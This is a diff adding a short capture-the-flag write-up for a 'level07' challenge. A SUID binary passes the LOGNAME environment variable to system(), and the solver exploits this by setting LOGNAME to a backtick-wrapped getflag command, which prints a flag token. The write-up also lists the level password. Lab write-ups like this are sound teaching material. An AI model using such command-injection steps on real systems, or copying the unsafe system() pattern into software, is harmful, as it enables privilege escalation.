@@ -1,0 +1,26 @@
+login/pw:
+	level07 : wiok45aaoguiboiki2tuin6ub
+
+RESOLUTION:
+	ls -l
+		=> -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
+			=> SUID flag07
+				=> Reverse Engineering
+	scp -P 4242 level07@192.168.1.23:~/level07 .
+	bash script.sh
+		=> New project
+			=> Analyze /level07
+				=> pcVar1 = getenv("LOGNAME")
+				=> asprintf(&local_1c,"/bin/echo %s ",pcVar1)
+				=> iVar2 = system(local_1c)
+					=> Get envvar LOGNAME
+					=> Create string /bin/echo $LOGNAME
+					=> Execute it
+	echo $LOGNAME
+		=> level07
+	./level07
+		=> level07
+			=> Works as expected
+	export LOGNAME="\`getflag\`"
+	./level07
+		=> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h 
